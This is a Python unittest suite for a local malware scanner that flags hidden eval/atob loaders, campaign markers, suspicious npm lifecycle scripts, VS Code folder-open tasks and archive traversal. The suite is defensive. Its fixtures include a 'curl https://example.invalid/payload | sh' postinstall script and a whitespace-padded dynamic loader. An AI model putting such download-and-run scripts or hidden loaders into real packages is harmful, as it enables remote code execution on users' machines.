from __future__ import annotations

import contextlib
import gc
import gzip
import hashlib
import io
import json
import os
import subprocess
import tarfile
import tempfile
import unittest
import unittest.mock
import warnings
import zipfile
from pathlib import Path

from security.local_code_scan import (
    Finding,
    LocalScanner,
    ScanConfig,
    ScanIssue,
    _git_environment,
    _npm_cache_integrity_finding,
    _scan_tar_bytes,
    _scan_archive_bytes,
    _validate_batch_header,
    _write_report,
    analyze_bytes,
    deduplicate_git_repositories,
    main,
    parse_args,
    scan_bytes,
    scan_git_repository,
)


def _dynamic_loader(*, marker: bytes | None = None, spaces: int = 596) -> bytes:
    dynamic_call = b"ev" + b"al("
    decoder = b"at" + b"ob("
    payload = b"export const clean = true;\n" + b" " * spaces
    if marker:
        payload += marker + b";"
    return payload + dynamic_call + decoder + b"'ZGFuZ2Vy'))\n"


def _rules(findings: list[object]) -> set[str]:
    return {finding.rule_id for finding in findings}  # type: ignore[attr-defined]


def _severities(findings: list[object]) -> set[str]:
    return {finding.severity for finding in findings}  # type: ignore[attr-defined]


def _git(repo: Path, *args: str, stdin: bytes | None = None) -> bytes:
    result = subprocess.run(
        ["/usr/bin/git", "-c", "core.hooksPath=/dev/null", "-C", str(repo), *args],
        input=stdin,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=True,
        env={
            "PATH": "/usr/bin:/bin",
            "LC_ALL": "C",
            "GIT_CONFIG_NOSYSTEM": "1",
            "GIT_CONFIG_GLOBAL": "/dev/null",
            "GIT_OPTIONAL_LOCKS": "0",
        },
    )
    return result.stdout


class LocalCodeScanUnitTest(unittest.TestCase):
    def test_git_object_walk_is_forced_offline(self) -> None:
        environment = _git_environment()
        self.assertEqual("1", environment["GIT_NO_LAZY_FETCH"])
        self.assertEqual("0", environment["GIT_TERMINAL_PROMPT"])

    def test_known_campaign_marker_and_padded_dynamic_loader_are_detected(self) -> None:
        marker = b"global." + b"i='5-4-23'"
        findings = scan_bytes("next.config.ts", _dynamic_loader(marker=marker, spaces=864))
        self.assertIn("campaign-marker", _rules(findings))
        self.assertIn("hidden-dynamic-loader", _rules(findings))
        self.assertIn("critical", _severities(findings))
        self.assertIn("high", _severities(findings))

    def test_original_npm_marker_variant_is_detected(self) -> None:
        marker = b"C260" + b"521A"
        findings = scan_bytes("npm/lib/cli.js", b"#!/usr/bin/env node\n" + b" " * 200 + marker)
        self.assertIn("npm-persistence-marker", _rules(findings))
        self.assertIn("critical", _severities(findings))

    def test_repeated_exact_ioc_is_reported_once_with_correct_location(self) -> None:
        marker = b"C260" + b"521A"
        findings = scan_bytes("npm/lib/cli.js", b"first\nsecond\n" + (marker + b"\n") * 10_000)
        matching = [finding for finding in findings if finding.rule_id == "npm-persistence-marker"]
        self.assertEqual(1, len(matching))
        self.assertEqual((3, 1), (matching[0].line, matching[0].column))

    def test_mutated_loader_without_exact_marker_still_scores_high(self) -> None:
        findings = scan_bytes("tool.mjs", _dynamic_loader(spaces=200))
        self.assertIn("hidden-dynamic-loader", _rules(findings))
        self.assertIn("high", _severities(findings))

    def test_nul_in_source_comment_does_not_disable_structural_rules(self) -> None:
        findings = scan_bytes("tool.js", b"/*\0*/\n" + _dynamic_loader(spaces=200))
        self.assertIn("hidden-dynamic-loader", _rules(findings))

    def test_compact_function_encoded_loader_scores_high(self) -> None:
        constructor = b"new " + b"Func" + b"tion("
        sample = b"const clean=1;" + b" " * 200 + constructor + b"A" * 512 + b")\n"
        findings = scan_bytes("loader.js", sample)
        self.assertIn("obfuscated-function-loader", _rules(findings))

    def test_distant_vendor_signals_are_not_combined_into_high_finding(self) -> None:
        constructor = b"Func" + b"tion("
        sample = constructor + b"A" * 512 + b")\n" + b"x" * (256 * 1024) + b"\n" * 64 + b"tail\n"
        findings = scan_bytes("large-vendor.js", sample)
        self.assertFalse(any(finding.severity in {"high", "critical"} for finding in findings))
        self.assertIn("hidden-padding-review", _rules(findings))

    def test_many_early_signals_do_not_hide_loader_cluster_at_file_tail(self) -> None:
        early = (b"eval(value);\n" * 20_000) + b"x" * (32 * 1024)
        findings = scan_bytes("tail-loader.js", early + _dynamic_loader(spaces=200))
        self.assertIn("hidden-dynamic-loader", _rules(findings))

    def test_common_ethereum_methods_without_incident_endpoint_are_review_only(self) -> None:
        first = b"eth_getTransaction" + b"ByHash"
        second = b"eth_getBlock" + b"ByNumber"
        dynamic = b"ev" + b"al("
        findings = scan_bytes("account-sdk.js", first + b";" + second + b";" + dynamic + b"source)")
        self.assertIn("blockchain-rpc-review", _rules(findings))
        self.assertFalse(any(finding.severity in {"high", "critical"} for finding in findings))

    def test_chain_endpoints_and_dynamic_execution_score_high(self) -> None:
        first = b"api." + b"trongrid.io"
        second = b"fullnode.mainnet." + b"aptoslabs.com"
        dynamic = b"ev" + b"al("
        findings = scan_bytes("loader.js", first + b";" + second + b";" + dynamic + b"source)")
        self.assertIn("blockchain-dead-drop-loader", _rules(findings))
        self.assertIn("high", _severities(findings))

    def test_benign_minified_function_constructor_is_not_high(self) -> None:
        findings = scan_bytes("vendor.min.js", b"const f=Func" + b"tion('return 1');f();\n")
        self.assertFalse(any(finding.severity in {"high", "critical"} for finding in findings))

    def test_eval_decoder_without_hiding_is_review_only(self) -> None:
        dynamic_call = b"ev" + b"al("
        decoder = b"at" + b"ob("
        findings = scan_bytes("legacy.js", dynamic_call + decoder + b"value))\n")
        self.assertEqual({"dynamic-decoder-review"}, _rules(findings))
        self.assertEqual({"review"}, _severities(findings))

    def test_network_download_and_execution_lifecycle_scores_high_without_leaking_command(self) -> None:
        manifest = {
            "name": "fixture",
            "scripts": {"postinstall": "curl https://example.invalid/payload | sh"},
        }
        findings = scan_bytes("node_modules/fixture/package.json", json.dumps(manifest).encode())
        finding = next(item for item in findings if item.rule_id == "suspicious-lifecycle-script")
        self.assertEqual("high", finding.severity)
        self.assertNotIn("example.invalid", finding.detail)

    def test_benign_lifecycle_is_counted_but_silent_without_inventory(self) -> None:
        manifest = {"scripts": {"postinstall": "node scripts/setup.js"}}
        analysis = analyze_bytes("node_modules/fixture/package.json", json.dumps(manifest).encode())
        self.assertEqual(1, analysis.lifecycle_scripts)
        self.assertNotIn("lifecycle-script-review", _rules(analysis.findings))

    def test_hidden_home_runtime_dependency_pair_scores_high(self) -> None:
        manifest = {"dependencies": {"axios": "1.0.0", "socket.io-client": "4.0.0"}}
        findings = scan_bytes("/Users/example/.node_modules/package.json", json.dumps(manifest).encode())
        self.assertIn("hidden-home-node-runtime", _rules(findings))

    def test_vscode_folder_open_execution_scores_high(self) -> None:
        tasks = {"tasks": [{"runOptions": {"runOn": "folderOpen"}, "command": "node helper.js"}]}
        findings = scan_bytes("repo/.vscode/tasks.json", json.dumps(tasks).encode())
        self.assertIn("vscode-folder-open-task", _rules(findings))
        self.assertIn("high", _severities(findings))

    def test_vscode_manual_node_task_is_not_combined_with_folder_open_task(self) -> None:
        tasks = {
            "tasks": [
                {"runOptions": {"runOn": "folderOpen"}, "command": "echo ready"},
                {"command": "node manual.js"},
            ]
        }
        findings = scan_bytes("repo/.vscode/tasks.json", json.dumps(tasks).encode())
        self.assertEqual({"review"}, _severities(findings))

    def test_npm_cache_path_digest_is_verified(self) -> None:
        data = b"clean cache content"
        digest = hashlib.sha512(data).hexdigest()
        clean = Path("/tmp/.npm/_cacache/content-v2/sha512") / digest[:2] / digest[2:4] / digest[4:]
        self.assertIsNone(_npm_cache_integrity_finding(clean, data))
        corrupt = clean.parent / ("0" + clean.name[1:])
        finding = _npm_cache_integrity_finding(corrupt, data)
        self.assertIsNotNone(finding)
        self.assertEqual("critical", finding.severity)  # type: ignore[union-attr]

    def test_tar_members_are_scanned_in_memory_and_traversal_is_reported(self) -> None:
        archive_buffer = io.BytesIO()
        malicious = _dynamic_loader(spaces=200)
        with tarfile.open(fileobj=archive_buffer, mode="w:gz") as archive:
            source = tarfile.TarInfo("package/index.js")
            source.size = len(malicious)
            archive.addfile(source, io.BytesIO(malicious))
            escape = tarfile.TarInfo("../../outside.js")
            escape.size = len(b"safe\n")
            archive.addfile(escape, io.BytesIO(b"safe\n"))
        with tempfile.TemporaryDirectory() as temporary_directory:
            outside = Path(temporary_directory).parent / "outside.js"
            before = outside.exists()
            result = _scan_tar_bytes(
                str(Path(temporary_directory) / "fixture.tgz"),
                archive_buffer.getvalue(),
                ScanConfig(),
            )
            self.assertEqual(before, outside.exists())
        self.assertIn("hidden-dynamic-loader", _rules(result.findings))
        self.assertIn("archive-path-traversal", _rules(result.findings))
        self.assertEqual(2, result.archive_members_scanned)

    def test_zip_members_are_scanned_without_extracting_links_or_traversal(self) -> None:
        archive_buffer = io.BytesIO()
        with zipfile.ZipFile(archive_buffer, mode="w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("package/index.js", _dynamic_loader(spaces=200))
            archive.writestr("..\\outside.js", b"safe\n")
            link = zipfile.ZipInfo("package/link.js")
            link.external_attr = (0o120777 << 16)
            archive.writestr(link, "package/index.js")
        result = _scan_archive_bytes("cache.zip", archive_buffer.getvalue(), ScanConfig())
        self.assertIn("hidden-dynamic-loader", _rules(result.findings))
        self.assertIn("archive-path-traversal", _rules(result.findings))
        self.assertIn("archive-link-member", [issue.operation for issue in result.issues])

    def test_zip_expansion_ratio_is_bounded(self) -> None:
        archive_buffer = io.BytesIO()
        with zipfile.ZipFile(archive_buffer, mode="w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("package/data.js", b"A" * 10_000)
        result = _scan_archive_bytes(
            "cache.zip",
            archive_buffer.getvalue(),
            ScanConfig(max_archive_ratio=2),
        )
        self.assertIn("archive-expansion-limit", [issue.operation for issue in result.issues])

    def test_nested_archives_share_one_expanded_byte_budget(self) -> None:
        inner_buffer = io.BytesIO()
        with zipfile.ZipFile(inner_buffer, mode="w", compression=zipfile.ZIP_STORED) as archive:
            archive.writestr("package/index.js", b"x" * 700)
        outer_buffer = io.BytesIO()
        with zipfile.ZipFile(outer_buffer, mode="w", compression=zipfile.ZIP_STORED) as archive:
            for index in range(4):
                archive.writestr(f"fixtures/{index}.zip", inner_buffer.getvalue())
        result = _scan_archive_bytes(
            "outer.zip",
            outer_buffer.getvalue(),
            ScanConfig(max_archive_total_bytes=2048, max_archive_member_bytes=2048),
        )
        self.assertIn("archive-total-limit", [issue.operation for issue in result.issues])
        self.assertLessEqual(result.bytes_scanned, 2048)

    def test_corrupt_named_zip_is_incomplete(self) -> None:
        result = _scan_archive_bytes("cache.zip", b"PK\x03\x04truncated", ScanConfig())
        self.assertEqual(["archive-open"], [issue.operation for issue in result.issues])

    def test_high_ratio_gzip_is_rejected_before_tar_iteration(self) -> None:
        compressed = gzip.compress(b"A" * (2 * 1024 * 1024))
        result = _scan_tar_bytes(
            "cache-blob",
            compressed,
            ScanConfig(max_archive_total_bytes=1024, max_archive_members=1, max_archive_ratio=10),
        )
        self.assertEqual([], result.findings)
        self.assertEqual(["archive-expansion-limit"], [issue.operation for issue in result.issues])

    def test_named_tgz_parse_failure_is_incomplete(self) -> None:
        result = _scan_tar_bytes("infected.tgz", gzip.compress(b"not a tar archive"), ScanConfig())
        self.assertEqual(["archive-open"], [issue.operation for issue in result.issues])

    def test_extensionless_non_tar_gzip_payload_is_scanned(self) -> None:
        result = _scan_tar_bytes("cache-object", gzip.compress(_dynamic_loader(spaces=200)), ScanConfig())
        self.assertEqual([], result.issues)
        self.assertIn("hidden-dynamic-loader", _rules(result.findings))
        self.assertEqual(1, result.archive_members_scanned)

    def test_damaged_archive_makes_cli_exit_incomplete(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            (root / "infected.tgz").write_bytes(gzip.compress(b"not a tar archive"))
            stdout = io.StringIO()
            stderr = io.StringIO()
            with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
                exit_code = main(
                    [
                        "--no-default-roots",
                        "--root",
                        str(root),
                        "--format",
                        "json",
                        "--jobs",
                        "1",
                        "--progress-every",
                        "0",
                    ]
                )
            report = json.loads(stdout.getvalue())
        self.assertEqual(2, exit_code)
        self.assertEqual(["archive-open"], [issue["operation"] for issue in report["errors"]])

    def test_scanner_never_executes_an_executable_fixture_and_does_not_follow_loop(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            marker = root / "executed"
            script = root / "do-not-run"
            script.write_text(f"#!/bin/sh\ntouch {marker}\n", encoding="utf-8")
            script.chmod(0o755)
            (root / "loop").symlink_to(root, target_is_directory=True)
            scanner = LocalScanner(
                ScanConfig(scan_archives=False),
                include_quarantine=False,
                excluded_paths=[],
                jobs=2,
                progress_every=0,
            )
            with contextlib.redirect_stderr(io.StringIO()):
                scanner.scan_roots([root])
            self.assertFalse(marker.exists())
            self.assertEqual(1, scanner.stats.symlinks_not_followed)
            self.assertEqual(1, scanner.stats.files_scanned)

    def test_non_candidate_hardlink_does_not_suppress_source_candidate(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            non_candidate = root / "a.png"
            non_candidate.write_bytes(_dynamic_loader(spaces=200))
            os.link(non_candidate, root / "z.js")
            scanner = LocalScanner(
                ScanConfig(scan_archives=False),
                include_quarantine=False,
                excluded_paths=[],
                jobs=1,
                progress_every=0,
            )
            with contextlib.redirect_stderr(io.StringIO()):
                scanner.scan_roots([root])
        self.assertEqual(1, scanner.stats.files_scanned)
        self.assertIn("hidden-dynamic-loader", _rules(scanner.findings))

    def test_hardlinked_json_does_not_suppress_package_manifest_semantics(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            ordinary = root / "a.json"
            ordinary.write_text(
                json.dumps({"scripts": {"postinstall": "curl https://example.invalid/x | sh"}}),
                encoding="utf-8",
            )
            os.link(ordinary, root / "package.json")
            scanner = LocalScanner(
                ScanConfig(scan_archives=False),
                include_quarantine=False,
                excluded_paths=[],
                jobs=1,
                progress_every=0,
            )
            with contextlib.redirect_stderr(io.StringIO()):
                scanner.scan_roots([root])
        self.assertEqual(2, scanner.stats.files_scanned)
        self.assertIn("suspicious-lifecycle-script", _rules(scanner.findings))

    def test_binary_candidate_hardlink_does_not_suppress_source_heuristics(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory) / "node_modules" / "fixture"
            root.mkdir(parents=True)
            binary_name = root / "a.wasm"
            binary_name.write_bytes(b"/*\0*/\n" + _dynamic_loader(spaces=200))
            os.link(binary_name, root / "z.js")
            scanner = LocalScanner(
                ScanConfig(scan_archives=False),
                include_quarantine=False,
                excluded_paths=[],
                jobs=1,
                progress_every=0,
            )
            with contextlib.redirect_stderr(io.StringIO()):
                scanner.scan_roots([root.parent.parent])
        self.assertEqual(2, scanner.stats.files_scanned)
        self.assertIn("hidden-dynamic-loader", _rules(scanner.findings))

    def test_git_hooks_symlink_is_not_followed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            parent = Path(temporary_directory)
            root = parent / "repo"
            git_directory = root / ".git"
            git_directory.mkdir(parents=True)
            outside = parent / "outside"
            outside.mkdir()
            (outside / "evil.js").write_bytes(_dynamic_loader(spaces=200))
            (git_directory / "hooks").symlink_to(outside, target_is_directory=True)
            scanner = LocalScanner(
                ScanConfig(scan_archives=False),
                include_quarantine=False,
                excluded_paths=[],
                jobs=1,
                progress_every=0,
            )
            with contextlib.redirect_stderr(io.StringIO()):
                scanner.scan_roots([root])
        self.assertEqual([], scanner.findings)
        self.assertGreaterEqual(scanner.stats.symlinks_not_followed, 1)

    def test_directory_replaced_by_symlink_before_open_is_not_followed(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            parent = Path(temporary_directory)
            root = parent / "root"
            inside = root / "inside"
            inside.mkdir(parents=True)
            outside = parent / "outside"
            outside.mkdir()
            (outside / "evil.js").write_bytes(_dynamic_loader(spaces=200))
            real_open = os.open
            swapped = False

            def racing_open(path: object, flags: int, *args: object, **kwargs: object) -> int:
                nonlocal swapped
                if path == "inside" and kwargs.get("dir_fd") is not None and not swapped:
                    inside.rmdir()
                    inside.symlink_to(outside, target_is_directory=True)
                    swapped = True
                return real_open(path, flags, *args, **kwargs)  # type: ignore[arg-type]

            scanner = LocalScanner(
                ScanConfig(scan_archives=False),
                include_quarantine=False,
                excluded_paths=[],
                jobs=1,
                progress_every=0,
            )
            with unittest.mock.patch("security.local_code_scan.os.open", side_effect=racing_open):
                with contextlib.redirect_stderr(io.StringIO()):
                    scanner.scan_roots([root])
        self.assertTrue(swapped)
        self.assertEqual([], scanner.findings)
        self.assertIn("open-directory", [issue.operation for issue in scanner.issues])

    def test_unreachable_git_blob_is_scanned(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            repo = Path(temporary_directory)
            _git(repo, "init", "-q")
            oid = _git(repo, "hash-object", "-w", "--stdin", stdin=_dynamic_loader(spaces=200)).strip().decode()
            with warnings.catch_warnings(record=True) as captured:
                warnings.simplefilter("always", ResourceWarning)
                result = scan_git_repository(repo, "all-objects", ScanConfig(scan_archives=False))
                gc.collect()
        self.assertGreater(result.files_scanned, 0)
        self.assertTrue(any(finding.git_oid == oid for finding in result.findings))
        self.assertIn("hidden-dynamic-loader", _rules(result.findings))
        self.assertFalse([warning for warning in captured if warning.category is ResourceWarning])

    def test_git_batch_uses_nonblocking_stderr_sink(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            repo = Path(temporary_directory)
            _git(repo, "init", "-q")
            _git(repo, "hash-object", "-w", "--stdin", stdin=b"clean\n")
            with unittest.mock.patch(
                "security.local_code_scan.subprocess.Popen",
                wraps=subprocess.Popen,
            ) as popen:
                result = scan_git_repository(repo, "all-objects", ScanConfig(scan_archives=False))
        self.assertEqual([], result.issues)
        self.assertEqual(subprocess.DEVNULL, popen.call_args.kwargs["stderr"])

    def test_oversized_git_blob_is_not_requested_from_batch_process(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            repo = Path(temporary_directory)
            with unittest.mock.patch(
                "security.local_code_scan._git_blob_metadata",
                return_value=([("a" * 40, 9)], None),
            ):
                with unittest.mock.patch("security.local_code_scan.subprocess.Popen") as popen:
                    result = scan_git_repository(
                        repo,
                        "all-objects",
                        ScanConfig(max_file_bytes=1, scan_archives=False),
                    )
        popen.assert_not_called()
        self.assertEqual(["git-blob-size-limit"], [issue.operation for issue in result.issues])

    def test_git_batch_header_validates_oid_and_size(self) -> None:
        oid = "a" * 40
        self.assertEqual(12, _validate_batch_header(f"{oid} blob 12\n".encode(), oid, 12, 12))
        with self.assertRaises(ValueError):
            _validate_batch_header(f"{'b' * 40} blob 12\n".encode(), oid, 12, 12)
        with self.assertRaises(ValueError):
            _validate_batch_header(f"{oid} blob 13\n".encode(), oid, 12, 20)
        with self.assertRaises(ValueError):
            _validate_batch_header(f"{oid} blob 12".encode(), oid, 12, 12)

    def test_linked_worktrees_share_one_git_object_scan(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            parent = Path(temporary_directory)
            repo = parent / "repo"
            repo.mkdir()
            _git(repo, "init", "-q")
            _git(repo, "config", "user.name", "Scanner Test")
            _git(repo, "config", "user.email", "scanner@example.invalid")
            (repo / "source.js").write_text("export const clean = true;\n", encoding="utf-8")
            _git(repo, "add", "source.js")
            _git(repo, "commit", "-qm", "initial")
            worktree = parent / "worktree"
            _git(repo, "worktree", "add", "-q", "-b", "other", str(worktree))
            repositories, issues = deduplicate_git_repositories([repo, worktree])
        self.assertEqual([], issues)
        self.assertEqual(1, len(repositories))

    def test_git_only_discovers_and_scans_bare_repository(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            parent = Path(temporary_directory)
            bare = parent / "archive.git"
            _git(parent, "init", "--bare", "-q", str(bare))
            oid = _git(bare, "hash-object", "-w", "--stdin", stdin=_dynamic_loader(spaces=200)).strip().decode()
            stdout = io.StringIO()
            stderr = io.StringIO()
            with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
                exit_code = main(
                    [
                        "--no-default-roots",
                        "--root",
                        str(parent),
                        "--git-history",
                        "all-objects",
                        "--git-only",
                        "--format",
                        "json",
                        "--jobs",
                        "1",
                        "--progress-every",
                        "0",
                    ]
                )
            report = json.loads(stdout.getvalue())
        self.assertEqual(1, exit_code)
        self.assertEqual(1, report["summary"]["git_repositories"])
        self.assertTrue(any(finding.get("git_oid") == oid for finding in report["findings"]))

    def test_json_report_is_parseable_and_high_finding_exits_one(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            (root / "infected.js").write_bytes(_dynamic_loader(spaces=200))
            stdout = io.StringIO()
            stderr = io.StringIO()
            with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
                exit_code = main(
                    [
                        "--no-default-roots",
                        "--root",
                        str(root),
                        "--format",
                        "json",
                        "--jobs",
                        "1",
                        "--progress-every",
                        "0",
                    ]
                )
            report = json.loads(stdout.getvalue())
        self.assertEqual(1, exit_code)
        self.assertEqual(1, report["summary"]["findings_by_severity"]["high"])
        self.assertEqual([], report["errors"])

    def test_missing_explicit_root_is_incomplete(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            missing = Path(temporary_directory) / "missing"
            stdout = io.StringIO()
            stderr = io.StringIO()
            with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
                exit_code = main(
                    [
                        "--no-default-roots",
                        "--root",
                        str(missing),
                        "--format",
                        "json",
                        "--jobs",
                        "1",
                        "--progress-every",
                        "0",
                    ]
                )
            report = json.loads(stdout.getvalue())
        self.assertEqual(2, exit_code)
        self.assertEqual(1, len(report["errors"]))

    def test_explicit_symlink_root_is_incomplete(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            parent = Path(temporary_directory)
            real = parent / "real"
            real.mkdir()
            link = parent / "link"
            link.symlink_to(real, target_is_directory=True)
            scanner = LocalScanner(
                ScanConfig(scan_archives=False),
                include_quarantine=False,
                excluded_paths=[],
                jobs=1,
                progress_every=0,
            )
            with contextlib.redirect_stderr(io.StringIO()):
                scanner.scan_roots([link])
        self.assertEqual(["root-symlink"], [issue.operation for issue in scanner.issues])

    def test_report_file_permissions_are_owner_only(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            report = Path(temporary_directory) / "report.json"
            _write_report(report, "{}\n")
            self.assertEqual(0o600, report.stat().st_mode & 0o777)

    def test_report_writer_refuses_symlink_target(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            parent = Path(temporary_directory)
            target = parent / "target.json"
            target.write_text("original\n", encoding="utf-8")
            link = parent / "report.json"
            link.symlink_to(target)
            with self.assertRaises(OSError):
                _write_report(link, "replacement\n")
            self.assertEqual("original\n", target.read_text(encoding="utf-8"))

    def test_human_rendering_quotes_terminal_control_sequences(self) -> None:
        control = "\x1b]52;c;payload\x07\r\nforged"
        finding = Finding("path", "rule", "review", control)
        issue = ScanIssue("path", "operation", control)
        for rendered in (finding.render(), issue.render()):
            self.assertNotIn("\x1b", rendered)
            self.assertNotIn("\x07", rendered)
            self.assertNotIn("\r", rendered)
            self.assertNotIn("\n", rendered)
            self.assertIn("\\u001b", rendered)

    def test_archive_and_git_only_cli_limits_are_explicit(self) -> None:
        args = parse_args(
            [
                "--no-default-roots",
                "--root",
                "/tmp/repo",
                "--git-history",
                "all-objects",
                "--git-only",
                "--max-file-mib",
                "300",
                "--max-archive-member-mib",
                "220",
                "--max-archive-total-mib",
                "512",
                "--max-archive-ratio",
                "100",
            ]
        )
        self.assertTrue(args.git_only)
        self.assertEqual(220, args.max_archive_member_mib)
        self.assertEqual(512, args.max_archive_total_mib)
        self.assertEqual(100, args.max_archive_ratio)


if __name__ == "__main__":
    unittest.main()
